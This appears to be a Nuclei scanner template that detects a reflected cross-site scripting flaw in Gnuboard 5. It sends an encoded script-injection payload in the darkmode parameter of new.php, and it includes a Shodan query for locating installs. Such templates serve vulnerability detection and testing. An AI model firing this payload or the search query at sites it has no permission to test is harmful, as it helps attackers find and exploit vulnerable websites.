http:
- matchers:
  - type: word
    words:
    - header\"><script>alert(document.domain)</script>.css?
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/bbs/new.php?darkmode=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
id: gnuboard5-xss
info:
  author: arafatansari
  classification:
    cpe: cpe:2.3:a:gnuboard:gnuboard5:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-80
  description: 'Gnuboard 5 contains a cross-site scripting vulnerability via the clean_xss_tags()
    function called in new.php.

    '
  metadata:
    max-request: 1
    product: gnuboard5
    shodan-query: http.html:"gnuboard5"
    vendor: gnuboard
    verified: true
  name: Gnuboard 5 - Cross-Site Scripting
  reference:
  - https://huntr.dev/bounties/ad2a9b32-fe6c-43e9-9b05-2c77c58dde6a/
  severity: medium
  tags: xss,gnuboard,gnuboard5,huntr,vuln
